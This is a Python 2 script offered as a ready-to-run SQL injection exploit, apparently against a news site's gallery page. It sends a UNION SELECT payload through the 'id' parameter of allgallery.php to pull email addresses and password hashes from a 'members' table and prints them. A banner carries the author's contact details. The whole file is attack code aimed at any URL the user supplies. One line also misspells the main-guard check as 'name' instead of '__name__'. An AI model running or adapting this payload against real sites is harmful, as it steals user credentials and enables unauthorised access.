import sys
from colorama import init
init()
from colorama import Fore
import requests as req
from BeautifulSoup import BeautifulSoup
import os
os.system("clear")
def banner():
        print(Fore.RED+'')
        print '*'*49
        print '* 1.0.0.1- SQL Injection    ' + '\t' + '*'
        print '* www.crnews.ir  ' + '\t' * 4 + '*'
        print '* Exploit By mr_mobin_dan@gmail.com ' + '*'
        print '* id telegram =@MR_MOBIN_DAN'+'*'
        print '* my telegram =t.me/termux_learning   ' +  '\t' * 2 + '*'
        print '*'*49
        print ''

def exploit(url):
        h = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'}
        print(Fore.GREEN + '[+] Sending Exploit ...' )
        try:
                q = 'allgallery.php?id=-100%27+union+select+concat(email,0x3a,password)+from+members%23'
                e = req.get(url+q,headers=h)
                if e.status_code == 200:
                        html = BeautifulSoup(e.content)
                        title = html.find('title')
                        if title != None :
                                data = title.string.split(':')
                                print(Fore.GREEN + '[+] User : ' + data[0] )
                                print(Fore.GREEN + '[+] Password Hash : ' + data[1].split(' ')[0] )
                        else :
                                print(Fore.RED + '[-] Sorry Site Not Vulnerable!')
                else:
                        print(Fore.RED + '[-] Sorry Site Not Vulnerable')
        except req.ConnectionError as ee :
                print(Fore.RED + '[-] Connection failed!')

def main():
        banner()
        if len(sys.argv) == 2 :
                exploit(sys.argv[1])
        else :
                print 'Usage : python exploit.py  http://url/'
                print 'Example : python exploit.py  http://exmpel.com/'


if name == '__main__':
        try:
                main()
        except KeyboardInterrupt as e:
                print 'Ctrl+C exit from user!'
                sys.exit()
